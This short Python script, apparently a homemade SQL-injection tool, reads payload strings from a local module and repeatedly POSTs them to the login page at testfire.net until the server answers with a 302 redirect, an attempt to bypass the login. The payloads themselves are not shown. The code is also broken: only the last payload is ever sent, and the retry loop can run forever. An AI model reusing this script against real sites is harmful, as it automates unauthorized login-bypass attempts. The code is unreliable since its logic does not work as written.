import sys
sys.path.append(r"D:\SQLjj\SQLJ\Database")
from database import main_prog,extraction
import asyncio
import requests
from colorama import Fore,init

init()

async def blind_attack():
    try:
        # await main_prog()
        url = "http://testfire.net/login.jsp"
        r = requests.get(url)
        if r.status_code == 200:
            payloadask = input("Do you want to send a payload to the target?")
            if payloadask == "y":
                # await extraction()
                for i in extraction:
                    for j in i:
                        new = j
                        new = str(new)
                req = requests.post(url=url,data=str(new))
                print(req.status_code)
                done = False
                while not done:
                    req = requests.post(url=url,data=str(new))
                    if req.status_code == 302:
                        done = True
                    else:
                        print("errr")

                
        else:
            # raise SystemExit
            pass
        # print(Fore.RED+str(r.status_code))
                
    except ConnectionError:
        pass
    
    except requests.ConnectionError:
        print("error")
        
    finally:
        pass
            
asyncio.run(blind_attack())    
# res = requests.get("http://testfire.net/")
# print(res.status_code)